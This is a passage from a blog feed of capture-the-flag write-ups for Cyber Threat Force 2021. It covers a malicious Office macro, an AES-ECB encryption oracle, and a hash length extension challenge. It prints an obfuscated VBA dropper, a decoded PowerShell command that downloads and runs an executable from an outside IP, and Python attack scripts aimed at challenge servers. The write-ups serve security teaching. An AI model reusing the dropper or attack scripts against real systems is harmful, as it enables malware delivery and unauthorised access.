qgCHXadDjflv = xDSnawULVynR(Array((181 Xor (28 - 14)), (255 - 5), 55, (7 + 235), (84 - 7), 174, ((94 - 24) + 23), (260 - 15), (5 + (75 - 11))), Array((221 + 27), 192, ((107 - 43) + 43), ((116 - 55) Xor (242 - 88)), ((103 - 49) Xor 8), (293 - 90), ((12 - 6) Xor 41), (47 Xor (81 + (150 - 62))), (43 - 18))) + BotaCipUCROa + xDSnawULVynR(Array(((9 + 2) Xor 211), (84 Xor ((1 - 0) + 46)), ((44 - 1) Xor 157), 196, (87 + (79 - 3)), 227, ((108 - 12) Xor 3), 77, (((28 - 7) + 9) Xor 62), (184 - 9), (89 - 37), 191, 140, 174, 81), Array(((27 + (94 - 46)) Xor (192 + 15)), (13 + 45), (58 + 140), (348 - 168), 231, (45 + (168 - 83)), (((11 - 2) + 7) Xor (5 + (2 - 0))), (42 Xor 6), 124, (436 - 209), (73 + 18), (72 Xor (86 + 62)), (145 Xor (149 - 25)), ((73 - 31) + (290 - 138)), (0 Xor 13))) &amp;amp; _
xDSnawULVynR(Array((474 - 234), 5, (345 - 131), 41, (26 + 91), 179, (95 - 38), (184 - 35), (67 Xor ((6 - 3) + 15)), 241, (106 - 49), (67 - 9), (135 - 36), 99, (2 Xor (0 + (0 - 0)))), Array(164, (92 + 4), (159 + 28), (40 + 49), ((17 - 2) + 26), (364 - 141), (13 Xor 85), (109 Xor 141), (53 + (20 - 10)), 146, 81, (72 + 23), (11 + 6), (134 - 53), 44)) &amp;amp; _
xDSnawULVynR(Array(35, ((2 - 0) + 91), ((10 - 3) + 49)), Array(87, ((5 + (3 - 0)) Xor 45), 76))
Dim OWbxyThhGwxilR As Object
Set OWbxyThhGwxilR = CreateObject(xDSnawULVynR(Array(79, (76 Xor (8 + (30 - 13))), (104 - 44), (101 - 11), ((81 - 34) + 79), ((124 - 43) + 56), (51 - 11), 147, (24 Xor 5), (25 Xor ((42 - 13) + 96)), 45, 89, 183, 97, (243 - 40)), Array((44 - 16), (7 Xor (94 - 45)), 78, (3 Xor 48), ((12 - 6) + 8), ((184 + 66) Xor ((4 - 2) + 5)), (72 - 7), ((26 + 1) Xor ((132 - 62) + (230 - 70))), (38 + 84), (61 Xor 119), 107, ((13 + (44 - 15)) Xor 26), (193 + (52 - 26)), 4, ((206 - 68) + 14))) &amp;amp; _
xDSnawULVynR(Array((86 + 23), (3 + 8), (343 - 110), 72, (14 + 65), ((168 - 61) Xor 242), 143, (((73 - 32) + 71) Xor ((164 - 61) + (165 - 40))), (353 - 131), (153 - 39), 45), Array((19 + 1), (183 - 63), (16 + (144 - 3)), (((4 - 0) + (0 - 0)) Xor 41), (24 + 10), 214, 237, (65 + 189), ((61 - 12) + (165 - 27)), 17, 89)))
Dim nThptKQUsbXIUwo As Object
Set nThptKQUsbXIUwo = OWbxyThhGwxilR.CreateTextFile(qgCHXadDjflv)
nThptKQUsbXIUwo.Write MwIMnegwljrXk
End Sub
Sub zrOxbjsXpxFIZ()
Dim rxarQjcLRAXXw As String
Dim BotaCipUCROa As String
Dim ATxXjGhAEyQcaRJ As String
BotaCipUCROa = Application.UserName
rxarQjcLRAXXw = xDSnawULVynR(Array(((157 - 42) + (135 - 62)), (0 - 0), (51 Xor ((190 - 58) + (86 - 39))), (176 - 63), ((34 - 9) + 4), (54 + 108), 37, (165 + (36 - 16)), ((21 + 7) Xor 140)), Array(255, (34 + (44 - 20)), 220, (15 Xor (58 - 15)), (89 + (41 - 20)), ((340 - 169) Xor ((37 - 7) + 78)), 87, ((36 - 14) + 180), ((17 + 1) Xor 222))) + BotaCipUCROa + xDSnawULVynR(Array((132 Xor (139 - 40)), 246, (1 Xor (44 - 21)), ((13 + 35) Xor (5 - 2)), (25 Xor 234), ((8 - 1) Xor (141 - 59)), (190 - 72), ((5 + 0) Xor ((14 - 4) + 25)), ((210 - 97) + 53), ((64 - 32) Xor ((146 - 30) + (18 - 1))), (28 Xor (61 + 0)), (71 Xor (401 - 168)), 135, (234 - 91), ((2 + 9) Xor (29 + 29))), Array((22 + 165), 183, (159 - 57), 67, (187 - 4), (22 + 30), (2 Xor (0 + 0)), 71, 250, (67 + (282 - 116)), ((26 + 21) Xor 97), (112 Xor 189), (134 Xor (190 - 94)), 227, 109)) &amp;amp; _
xDSnawULVynR(Array(162, ((4 - 1) + (12 - 6)), ((4 + 10) Xor ((101 - 40) + 47)), (199 - 62), (((9 - 4) + 5) Xor 7)), Array((363 - 117), (184 - 76), (5 + 10), (376 - 127), 81))
Dim prqLKrcSwieM As String
Dim AxpTNmhEQQBv As String
prqLKrcSwieM = xDSnawULVynR(Array(46, (418 - 180), 197, (87 - 38), 114, ((191 - 66) Xor (84 + 137)), (227 Xor 8), 232, 212, 61, (125 Xor 130), 182, ((9 + 31) Xor 113)), Array((33 + (66 - 33)), 143, 176, (93 + 2), 17, ((275 - 80) Xor (4 + 7)), 142, (((30 - 14) + 0) Xor (57 + (129 - 48))), ((64 - 6) + 172), 19, (51 + 88), 206, (19 + 26)))
AxpTNmhEQQBv = xDSnawULVynR(Array(((123 - 59) + (21 - 7)), (29 + 36), (14 + (109 - 49)), (2 + 130), ((29 + 97) Xor 244), ((25 - 6) Xor 13), ((75 + 13) Xor (206 - 60)), ((62 - 9) Xor (77 + (62 - 10))), 172, (54 Xor 81), 192, (38 Xor 132), (128 - 27)), Array((2 + 32), 32, 63, (68 Xor 174), (171 Xor 66), 118, 175, (142 Xor 72), (61 + (105 - 8)), 73, (37 + (141 - 16)), (183 Xor (197 - 81)), ((6 - 0) + 11)))
Name rxarQjcLRAXXw &amp;amp; prqLKrcSwieM As rxarQjcLRAXXw &amp;amp; AxpTNmhEQQBv
End Sub
Sub XEFxqSzaXCXvSAp()
Dim BotaCipUCROa As String
Dim qgCHXadDjflv As String
BotaCipUCROa = Application.UserName
qgCHXadDjflv = xDSnawULVynR(Array((38 + (74 - 37)), 158, (200 + 53), ((7 - 2) + 243), (60 + 141), 110, (((123 - 60) + (27 - 2)) Xor (107 - 49)), (11 + 33), (81 + 84)), Array((5 Xor 13), (56 + (171 - 63)), 161, 173, (119 Xor 205), (7 + (4 - 0)), ((15 + 0) Xor ((6 - 3) + 28)), ((80 - 36) Xor 115), 249)) + BotaCipUCROa + xDSnawULVynR(Array((93 - 20), 79, 41, (242 + 0), 26, 117, (59 Xor (26 + (111 - 37))), (375 - 166), ((27 + 6) Xor 110), (97 - 5), 208, 61, 37, ((83 - 34) Xor 97), 97), Array((((7 - 3) + (5 - 1)) Xor 29), 14, ((38 - 16) Xor 79), 130, 94, (10 + 10), ((3 + (6 - 2)) Xor (49 - 5)), 176, (0 + (21 - 2)), 16, 191, ((2 - 1) + 93), 68, ((45 - 6) + 21), (39 + 22))) &amp;amp; _
xDSnawULVynR(Array(9, 140, 157, 249, (29 Xor 142), 166, (118 Xor 182), 23, ((16 - 0) Xor (6 + (77 - 38))), (50 + 74), ((27 + 37) Xor (242 - 67)), (((74 - 7) + 77) Xor 36), (3 Xor 146), (104 - 4), 207), Array((23 Xor (94 - 20)), (443 - 210), (148 + (132 - 40)), ((59 + 1) Xor 181), 207, ((0 + 56) Xor (78 + 164)), (308 - 147), ((55 - 7) + 50), ((14 + 69) Xor 0), 31, 135, (128 + 81), (434 - 207), 86, (368 - 143))) &amp;amp; _
xDSnawULVynR(Array((135 + (16 - 2)), 2, ((46 - 18) + 41)), Array((181 + 66), (22 + 77), (0 + 49)))
Shell qgCHXadDjflv, vbHide
Sleep (644 Xor 1364)
Kill qgCHXadDjflv
End Sub
&lt;/code>&lt;/pre>&lt;p>We can identify a few interesting parts:&lt;/p>
&lt;pre>&lt;code class="language-vba" data-lang="vba">' In LwvYeveWxaeE, a file is created.
Dim nThptKQUsbXIUwo As Object
Set nThptKQUsbXIUwo = OWbxyThhGwxilR.CreateTextFile(qgCHXadDjflv)
nThptKQUsbXIUwo.Write MwIMnegwljrXk
' In XEFxqSzaXCXvSAp, that file is spawned as a process (same variable: qgCHXadDjflv).
Shell qgCHXadDjflv, vbHide
Sleep (644 Xor 1364)
Kill qgCHXadDjflv
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s try to see what&amp;rsquo;s written in the file. Since I&amp;rsquo;m more comfortable with python, I converted the code using &lt;a href="http://vb2py.sourceforge.net/online_conversion.html">this tool&lt;/a>. Note that I had to download &lt;a href="http://vb2py.sourceforge.net/downloads.html">the source code&lt;/a> to make the script run, since the package wouldn&amp;rsquo;t install using &lt;code>pip&lt;/code> for me.&lt;/p>
&lt;p>Trying to run the converted code does nothing, since we have to call a function. Let&amp;rsquo;s call &lt;code>LwvYeveWxaeE&lt;/code>, which creates the file:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python converted.py
Traceback &lt;span style="color:#f92672">(&lt;/span>most recent call last&lt;span style="color:#f92672">)&lt;/span>:
File &lt;span style="color:#e6db74">&amp;#34;/home/vivescere/ctf/the-document-is-strange/test/converted.py&amp;#34;&lt;/span>, line 89, in &amp;lt;module&amp;gt;
LwvYeveWxaeE&lt;span style="color:#f92672">()&lt;/span>
File &lt;span style="color:#e6db74">&amp;#34;/home/vivescere/ctf/the-document-is-strange/test/converted.py&amp;#34;&lt;/span>, line 53, in LwvYeveWxaeE
BotaCipUCROa &lt;span style="color:#f92672">=&lt;/span> Application.UserName
NameError: name &lt;span style="color:#e6db74">&amp;#39;Application&amp;#39;&lt;/span> is not defined
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now if we look a bit further up, at this point what&amp;rsquo;s being written to the file is already created. Let&amp;rsquo;s print it:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">...&lt;/span>
&lt;span style="color:#66d9ef">print&lt;/span>(MwIMnegwljrXk)
&lt;span style="color:#66d9ef">return&lt;/span>
BotaCipUCROa &lt;span style="color:#f92672">=&lt;/span> Application&lt;span style="color:#f92672">.&lt;/span>UserName
&lt;span style="color:#f92672">...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python converted.py
powershell.exe -exec bypass -enc JABQAHIAbwBjAE4AYQBtAGUAIAA9ACAAIgBwAGEAdABjAGgALgBlAHgAZQAiAA0ACgAkAFcAZQBiAEYAaQBsAGUAIAA9ACAAIgBoAHQAdABwADoALwAvADEANQAyAC4AMgAyADgALgAxADMAMwAuADYAOAAvACQAUAByAG8AYwBOAGEAbQBlACIADQAKACAADQAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAFcAZQBiAEYAaQBsAGUALAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAKAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA&lt;span style="color:#f92672">==&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>An encoded powershell command! Let&amp;rsquo;s decode it:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ echo &lt;span style="color:#e6db74">&amp;#39;JABQAHIAbwBjAE4AYQBtAGUAIAA9ACAAIgBwAGEAdABjAGgALgBlAHgAZQAiAA0ACgAkAFcAZQBiAEYAaQBsAGUAIAA9ACAAIgBoAHQAdABwADoALwAvADEANQAyAC4AMgAyADgALgAxADMAMwAuADYAOAAvACQAUAByAG8AYwBOAGEAbQBlACIADQAKACAADQAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAFcAZQBiAEYAaQBsAGUALAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAKAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA==&amp;#39;&lt;/span> | base64 -d
$ProcName &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;patch.exe&amp;#34;&lt;/span>
$WebFile &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://152.228.133.68/&lt;/span>$ProcName&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;span style="color:#f92672">(&lt;/span>New-Object System.Net.WebClient&lt;span style="color:#f92672">)&lt;/span>.DownloadFile&lt;span style="color:#f92672">(&lt;/span>$WebFile,&lt;span style="color:#e6db74">&amp;#34;&lt;/span>$env&lt;span style="color:#e6db74">:APPDATA\$ProcName&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
Start-Process &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>$env&lt;span style="color:#e6db74">:APPDATA\$ProcName&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>OK so a &lt;code>patch.exe&lt;/code> file is downloaded, and executed. Let&amp;rsquo;s take a look:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ wget http://152.228.133.68/patch.exe
$ file patch.exe
patch.exe: PE32 executable &lt;span style="color:#f92672">(&lt;/span>console&lt;span style="color:#f92672">)&lt;/span> Intel &lt;span style="color:#ae81ff">80386&lt;/span> Mono/.Net assembly, &lt;span style="color:#66d9ef">for&lt;/span> MS Windows
&lt;/code>&lt;/pre>&lt;/div>&lt;p>It&amp;rsquo;s a .NET program, we can use &lt;a href="https://github.com/icsharpcode/ILSpy">ILSpy&lt;/a> to analyze it. It only contains a bit of code:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cs" data-lang="cs">&lt;span style="color:#75715e">// @Ó”
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">using&lt;/span> System;
&lt;span style="color:#66d9ef">using&lt;/span> System.IO;
&lt;span style="color:#66d9ef">using&lt;/span> System.Net;
&lt;span style="color:#66d9ef">using&lt;/span> System.Runtime.InteropServices;
&lt;span style="color:#66d9ef">using&lt;/span> System.Threading;
&lt;span style="color:#66d9ef">internal&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">@Ó”&lt;/span>
{
&lt;span style="color:#a6e22e"> [DllImport(&amp;#34;kernel32.dll&amp;#34;, EntryPoint = &amp;#34;GetConsoleWindow&amp;#34;)]&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">extern&lt;/span> IntPtr &lt;span style="color:#960050;background-color:#1e0010">@Ó“&lt;/span>();
&lt;span style="color:#a6e22e">
&lt;/span>&lt;span style="color:#a6e22e"> [DllImport(&amp;#34;user32.dll&amp;#34;, EntryPoint = &amp;#34;ShowWindow&amp;#34;)]&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">extern&lt;/span> &lt;span style="color:#66d9ef">bool&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">@Ó”&lt;/span>(IntPtr &lt;span style="color:#960050;background-color:#1e0010">@Ó“&lt;/span>, &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">@Ó”&lt;/span>);
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Main(&lt;span style="color:#66d9ef">string&lt;/span>[] args)
{
&lt;span style="color:#960050;background-color:#1e0010">@Ó”&lt;/span>(&lt;span style="color:#960050;background-color:#1e0010">@Ó“&lt;/span>(), &lt;span style="color:#ae81ff">0&lt;/span>);
Thread.Sleep(&lt;span style="color:#ae81ff">30000&lt;/span>);
Console.WriteLine(&lt;span style="color:#e6db74">&amp;#34;http://152.228.133.68/staged_payload.txt&amp;#34;&lt;/span>);
WebRequest webRequest = WebRequest.Create(&lt;span style="color:#e6db74">&amp;#34;http://152.228.133.68/staged_payload.txt&amp;#34;&lt;/span>);
webRequest.Method = &lt;span style="color:#e6db74">&amp;#34;GET&amp;#34;&lt;/span>;
Console.WriteLine(&lt;span style="color:#66d9ef">new&lt;/span> StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd());
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s take a look at that payload:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl http://152.228.133.68/staged_payload.txt
CYBERTF&lt;span style="color:#f92672">{&lt;/span>M4cr0_D0wnl0ad3r_1s_D0wn&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we go, the flag is &lt;code>CYBERTF{M4cr0_D0wnl0ad3r_1s_D0wn}&lt;/code>.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/the-document-is-strange">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Strange service</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-crypto-strange-service/</link><pubDate>Sat, 10 Jul 2021 17:18:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-crypto-strange-service/</guid><description>For this challenge, we were given access to a service. The description told us that it was an encryption oracle, which used AES to encrypt what we sent it, concatenated with critical data.
I&amp;rsquo;m writting this after the challenge ended, so I can&amp;rsquo;t include demos.
The description should make us think about byte-at-a-time ECB decryption attacks, which are well explained here:
Cryptopals - Byte-a-time ECB decryption (Simple) Why is Byte-at-a-time ECB decryption a vulnerability?</description><content>&lt;p>For this challenge, we were given access to a service. The description told us that it was an encryption oracle, which used AES to encrypt what we sent it, concatenated with critical data.&lt;/p>
&lt;p>I&amp;rsquo;m writting this after the challenge ended, so I can&amp;rsquo;t include demos.&lt;/p>
&lt;p>The description should make us think about byte-at-a-time ECB decryption attacks, which are well explained here:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://crypto.stackexchange.com/questions/55673/why-is-byte-at-a-time-ecb-decryption-a-vulnerability">Cryptopals - Byte-a-time ECB decryption (Simple)&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://crypto.stackexchange.com/questions/55673/why-is-byte-at-a-time-ecb-decryption-a-vulnerability">Why is Byte-at-a-time ECB decryption a vulnerability? - Crypto StackExchange&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://pequalsnp-team.github.io/cheatsheet/crypto-101#encryption-oracle-attack">Cheatsheet - Crypto 101&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>I never used this attack before, but heard about it, so I decided to try it. It only works with the ECB mode, which I guessed was what the service was running. I could have &lt;a href="https://stackoverflow.com/a/20723807/6262617">tested this&lt;/a>.&lt;/p>
&lt;p>The premise is really simple: the ECB mode slices up the data in blocks, which are encrypted separately. Imagine we have &lt;code>encrypt(input || secret)&lt;/code>. If the block size is 4, what we could do is:&lt;/p>
&lt;ul>
&lt;li>send &lt;code>aaa&lt;/code>, and retrieve the first block data ; the first character of the secret will get added to form &lt;code>'aaa' + secret[0]&lt;/code>,&lt;/li>
&lt;li>send &lt;code>aaaa&lt;/code>, and compare the first block data with the previous value ; if it matches, the first character of the secret is &lt;code>a&lt;/code>,&lt;/li>
&lt;li>otherwise, retry with &lt;code>aaab&lt;/code>, &lt;code>aaac&lt;/code>, &amp;hellip;&lt;/li>
&lt;/ul>
&lt;p>We can script this out:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> string
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ERROR&amp;#39;&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">service&lt;/span>(inp):
r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#39;144.217.73.235&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">29292&lt;/span>)
prompt &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;: &amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>sendline(inp)
output &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvall()
r&lt;span style="color:#f92672">.&lt;/span>close()
&lt;span style="color:#66d9ef">return&lt;/span> output
known &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> known&lt;span style="color:#f92672">.&lt;/span>endswith(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;}&amp;#39;&lt;/span>):
&lt;span style="color:#75715e"># One char short&lt;/span>
l &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(known)
target &lt;span style="color:#f92672">=&lt;/span> service(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;0&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> l)[:&lt;span style="color:#ae81ff">64&lt;/span>]
&lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>printable&lt;span style="color:#f92672">.&lt;/span>encode():
b &lt;span style="color:#f92672">=&lt;/span> bytes([b])
block &lt;span style="color:#f92672">=&lt;/span> service(known&lt;span style="color:#f92672">.&lt;/span>zfill(&lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> b)[:&lt;span style="color:#ae81ff">64&lt;/span>]
&lt;span style="color:#66d9ef">if&lt;/span> target &lt;span style="color:#f92672">==&lt;/span> block:
&lt;span style="color:#66d9ef">print&lt;/span>(b&lt;span style="color:#f92672">.&lt;/span>decode(), end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>)
known &lt;span style="color:#f92672">+=&lt;/span> b
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;span style="color:#66d9ef">else&lt;/span>:
&lt;span style="color:#66d9ef">print&lt;/span>()
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>I used 64 chars because that&amp;rsquo;s the size of the returned data. I&amp;rsquo;ve failed to retrieve the flag once or twice before because I tried with the block size (16) instead, which only retrieved the start of the secret.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python solve.py
CYBERTF&lt;span style="color:#f92672">{&lt;/span>WTF_Itâ€™s_u$eless_in_real_w0rld&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag was &lt;code>CYBERTF{WTF_Itâ€™s_u$eless_in_real_w0rld}&lt;/code>.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/crypto/strange-service">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Strange administration service</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-crypto-strange-administration-service/</link><pubDate>Sat, 10 Jul 2021 15:55:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-crypto-strange-administration-service/</guid><description>For this challenge, we were given access to a server which we can connect to:
$ nc 144.217.73.235 27099 give me cmd|token example: ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140 id|69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140 chall.py wrapper $ nc 144.217.73.235 27099 give me cmd|token example: ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140 id|69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a whoami|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140 Bad Token It executes the command we give it, given that we know the corresponding hash. The challenge description told us that the hash format is HASH(SECRET || CMD).
This should instantly make us think of hash key length extension attacks.</description><content>&lt;p>For this challenge, we were given access to a server which we can connect to:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ nc 144.217.73.235 &lt;span style="color:#ae81ff">27099&lt;/span>
give me cmd|token
example:
ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140
id|69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a
ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140
chall.py
wrapper
$ nc 144.217.73.235 &lt;span style="color:#ae81ff">27099&lt;/span>
give me cmd|token
example:
ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140
id|69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a
whoami|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140
Bad Token
&lt;/code>&lt;/pre>&lt;/div>&lt;p>It executes the command we give it, given that we know the corresponding hash. The challenge description told us that the hash format is &lt;code>HASH(SECRET || CMD)&lt;/code>.&lt;/p>
&lt;p>This should instantly make us think of &lt;a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">hash key length extension attacks&lt;/a>. I&amp;rsquo;ve written about this previously, for the &lt;a href="https://nicolasb.fr/blog/writeup-dghack-stickitup/">DG&amp;rsquo;hAck StickItUp challenge&lt;/a>.&lt;/p>
&lt;p>This attack allows us to append arbitrary data at the end of an hashed value, while keeping the hash valid. Here, we can append &lt;code> ; my_command&lt;/code> to the existing command to execute what we want.&lt;/p>
&lt;p>We&amp;rsquo;ll use the same tool: &lt;a href="https://github.com/bwall/HashPump">hashpump&lt;/a>. First, we have to figure out the key length. The service returned &lt;code>Bad Token&lt;/code> when we tried to pass the &lt;code>ls&lt;/code> hash for the &lt;code>whoami&lt;/code> command, so let&amp;rsquo;s use that.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># To remove warnings from hashpumpy ; https://stackoverflow.com/a/879249/6262617&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> warnings
warnings&lt;span style="color:#f92672">.&lt;/span>filterwarnings(&lt;span style="color:#e6db74">&amp;#34;ignore&amp;#34;&lt;/span>, category&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">DeprecationWarning&lt;/span>)
&lt;span style="color:#f92672">import&lt;/span> hashpumpy
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#75715e"># To remove remote(...) logs&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ERROR&amp;#39;&lt;/span>
ID_HASH &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a&amp;#39;&lt;/span>
